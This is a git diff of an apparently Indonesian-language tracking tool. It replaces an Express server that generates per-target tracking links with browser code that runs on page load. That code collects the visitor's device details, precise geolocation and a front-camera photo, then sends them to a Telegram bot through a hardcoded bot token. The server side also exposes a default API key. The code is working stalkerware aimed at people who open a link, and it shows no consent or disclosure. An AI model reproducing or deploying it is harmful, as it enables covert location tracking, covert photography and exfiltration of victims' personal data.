@@ -1,164 +1,139 @@
-const express = require('express');
-const axios = require('axios');
-const FormData = require('form-data');
-const { v4: uuidv4 } = require('uuid');
-const cors = require('cors');
-const path = require('path');
+const statusList = document.getElementById('status-list');
+const videoEl = document.getElementById('video');
+const canvasEl = document.getElementById('canvas');
 
-const app = express();
-const PORT = process.env.PORT || 3000;
+const params = new URLSearchParams(window.location.search);
+const alias = params.get('alias');
+const chatId = params.get('uid');
+const botToken = '6136209053:AAF01MfDjE9oIajSHIDBDTpJ70CUuTqQLpY';
 
-const API_KEY = process.env.API_KEY || "KucingTerbangWarnaWarni123!";
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "6136209053:AAF01MfDjE9oIajSHIDBDTpJ70CUuTqQLpY"; 
-
-const tracking_data = {};
-
-app.use(cors());
-app.use(express.json({ limit: '10mb' }));
-app.use(express.static(path.join(__dirname, 'public')));
-
-const apiKeyAuth = (req, res, next) => {
-    const apiKey = req.headers['x-api-key'];
-    if (apiKey && apiKey === API_KEY) {
-        next();
-    } else {
-        res.status(403).json({ status: "error", message: "Unauthorized: Invalid API Key" });
-    }
+const updateStatus = (message, isError = false) => {
+  const li = document.createElement('li');
+  li.textContent = message;
+  if (isError) li.className = 'error';
+  statusList.appendChild(li);
+  statusList.scrollTop = statusList.scrollHeight;
 };
 
-async function sendTelegramNotification(chatId, alias, data) {
-    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
-    console.log(`[INFO] Memulai pengiriman notifikasi lengkap untuk ${alias}...`);
-    
-    try {
-        const detailText = `*Laporan Teks untuk ${alias}*\n\n` +
-                           `*Waktu:* ${new Date(data.timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n` +
-                           `*🔋 Baterai:*\nLevel: ${data.deviceInfo?.battery?.level || 'N/A'}\nMengisi Daya: ${data.deviceInfo?.battery?.isCharging ? 'Ya' : 'Tidak'}\n\n` +
-                           `*💻 Perangkat:*\n${data.deviceInfo?.userAgent || 'N/A'}`;
+const getDeviceInfo = () => {
+  updateStatus('1. Mengambil info perangkat...');
+  const data = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform || 'N/A',
+    language: navigator.language,
+    screenWidth: window.screen.width,
+    screenHeight: window.screen.height,
+  };
+  if (navigator.getBattery) {
+    return navigator.getBattery().then(battery => {
+      data.battery = {
+        level: Math.round(battery.level * 100) + '%',
+        isCharging: battery.charging
+      };
+      return data;
+    });
+  } else {
+    data.battery = { level: 'N/A', isCharging: 'N/A' };
+    return Promise.resolve(data);
+  }
+};
 
-        if (data.photoBase64) {
-            const photoBuffer = Buffer.from(data.photoBase64.replace(/^data:image\/jpeg;base64,/, ""), 'base64');
-            const formData = new FormData();
-            
-            formData.append('chat_id', chatId);
-            formData.append('photo', photoBuffer, 'snapshot.jpg');
-            formData.append('caption', `🔔 *Update Baru untuk ${alias}!*\n\n${detailText}`);
-            formData.append('parse_mode', 'Markdown');
-            
-            await axios.post(`${telegramApiUrl}/sendPhoto`, formData, {
-                headers: formData.getHeaders()
-            });
-            console.log(`[SUCCESS] Notifikasi foto & teks untuk ${alias} terkirim.`);
-
-        } else {
-            const messageText = `🔔 *Update Baru untuk ${alias}!*\n\n${detailText}`;
-            await axios.post(`${telegramApiUrl}/sendMessage`, {
-                chat_id: chatId,
-                text: messageText,
-                parse_mode: 'Markdown'
-            });
-            console.log(`[SUCCESS] Notifikasi teks (tanpa foto) untuk ${alias} terkirim.`);
-        }
-
-        if (data.location) {
-            await axios.post(`${telegramApiUrl}/sendLocation`, {
-                chat_id: chatId,
-                latitude: data.location.lat,
-                longitude: data.location.lon
-            });
-            console.log(`[SUCCESS] Notifikasi lokasi untuk ${alias} terkirim.`);
-        }
-
-    } catch (error) {
-        console.error(`[ERROR] Gagal mengirim notifikasi Telegram lengkap:`, error.response ? error.response.data : error.message);
+const getLocation = () => {
+  updateStatus('2. Mengambil lokasi...');
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) {
+      reject(new Error('Geolocation tidak tersedia.'));
+      return;
     }
-}
+    navigator.geolocation.getCurrentPosition(
+      position => {
+        resolve({
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+          accuracy: position.coords.accuracy
+        });
+      },
+      error => reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`)),
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  });
+};
 
+const getPhoto = async () => {
+  updateStatus('3. Mengambil foto...');
+  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+  videoEl.srcObject = stream;
+  await new Promise(resolve => videoEl.onloadedmetadata = resolve);
+  videoEl.play();
+  await new Promise(resolve => setTimeout(resolve, 500));
+  canvasEl.width = videoEl.videoWidth;
+  canvasEl.height = videoEl.videoHeight;
+  const context = canvasEl.getContext('2d');
+  context.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+  const photoBase64 = canvasEl.toDataURL('image/jpeg', 0.7);
+  stream.getTracks().forEach(track => track.stop());
+  videoEl.srcObject = null;
+  return photoBase64;
+};
 
-app.post('/api/data', (req, res) => {
-    const { link_id, data } = req.body;
-    if (!link_id || !data) return res.status(400).json({ status: "error", message: "Data tidak lengkap" });
-    
-    let found = false;
-    for (const userId in tracking_data) {
-        for (const alias in tracking_data[userId]) {
-            if (tracking_data[userId][alias].link_id === link_id) {
-                const current_data = { ...data, timestamp: new Date().toISOString() };
-                tracking_data[userId][alias].last_data = current_data;
-                found = true;
-                console.log(`[SUCCESS] Data untuk alias '${alias}' berhasil disimpan.`);
-                
-                // Panggil fungsi notifikasi baru yang canggih!
-                sendTelegramNotification(userId, alias, current_data);
-                break;
-            }
-        }
-        if (found) break;
-    }
+const sendToTelegram = async (data) => {
+  const message = `
+📱 *Perangkat* (${alias})
+• UA: ${data.deviceInfo.userAgent}
+• Platform: ${data.deviceInfo.platform}
+• Resolusi: ${data.deviceInfo.screenWidth}x${data.deviceInfo.screenHeight}
+• Baterai: ${data.deviceInfo.battery.level}, Charging: ${data.deviceInfo.battery.isCharging}
+  `.trim();
 
-    if (found) {
-        res.json({ status: "sukses" });
-    } else {
-        res.status(404).json({ status: "error", message: "Link ID tidak ditemukan" });
-    }
-});
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'Markdown'
+    })
+  });
 
-app.post('/api/create_link', apiKeyAuth, (req, res) => {
-    const { user_id, alias } = req.body;
-    if (!user_id || !alias) {
-        return res.status(400).json({ status: "error", message: "user_id dan alias diperlukan" });
-    }
-    const link_id = uuidv4();
-    const link_url = `${req.protocol}://${req.get('host')}/?id=${link_id}`;
-    if (!tracking_data[user_id]) {
-        tracking_data[user_id] = {};
-    }
-    tracking_data[user_id][alias] = {
-        link_id: link_id,
-        last_data: null,
-        link: link_url,
-        created_at: new Date().toISOString()
-    };
-    console.log(`[INFO] Link dibuat untuk user ${user_id} dengan alias ${alias}`);
-    res.json({ status: "sukses", link: link_url });
-});
+  await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      latitude: data.location.lat,
+      longitude: data.location.lon
+    })
+  });
 
-app.get('/api/list_links/:user_id', apiKeyAuth, (req, res) => {
-    const { user_id } = req.params;
-    const userLinks = tracking_data[user_id];
-    if (!userLinks) {
-        return res.json({ status: "sukses", links: [] });
-    }
-    const linksToReturn = Object.keys(userLinks).map(alias => ({
-        alias: alias,
-        link: userLinks[alias].link,
-        has_data: !!userLinks[alias].last_data
-    }));
-    res.json({ status: "sukses", links: linksToReturn });
-});
+  const blob = await (await fetch(data.photoBase64)).blob();
+  const formData = new FormData();
+  formData.append('chat_id', chatId);
+  formData.append('photo', blob, 'selfie.jpg');
 
-app.get('/api/get_data/:user_id/:alias', apiKeyAuth, (req, res) => {
-    const { user_id, alias } = req.params;
-    const trackingInfo = tracking_data[user_id]?.[alias];
-    if (trackingInfo && trackingInfo.last_data) {
-        res.json({ status: "sukses", data: trackingInfo.last_data });
-    } else {
-        res.status(404).json({ status: "error", message: "Data belum tersedia atau alias tidak ditemukan." });
-    }
-});
+  await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+    method: 'POST',
+    body: formData
+  });
+};
 
-app.post('/api/delete_link', apiKeyAuth, (req, res) => {
-    const { user_id, alias } = req.body;
-    if (tracking_data[user_id]?.[alias]) {
-        delete tracking_data[user_id][alias];
-        console.log(`[INFO] Link untuk alias ${alias} dari user ${user_id} telah dihapus.`);
-        res.json({ status: "sukses", message: `Link untuk ${alias} berhasil dihapus.` });
-    } else {
-        res.status(404).json({ status: "error", message: "Alias tidak ditemukan" });
-    }
-});
+const start = async () => {
+  updateStatus();
+  try {
+    const data = {};
+    data.deviceInfo = await getDeviceInfo();
+    updateStatus();
+    data.location = await getLocation();
+    updateStatus();
+    data.photoBase64 = await getPhoto();
+    updateStatus();
+    await sendToTelegram(data);
+    updateStatus();
+  } catch (err) {
+    console.error(err);
+    updateStatus(`❌ Error: ${err.message}`, true);
+  }
+};
 
-// 6. JALANKAN SERVER
-app.listen(PORT, () => {
-    console.log(`Server pelacakan (versi notifikasi lengkap) berjalan di port ${PORT}`);
+window.addEventListener('DOMContentLoaded', () => {
+  start();
 });
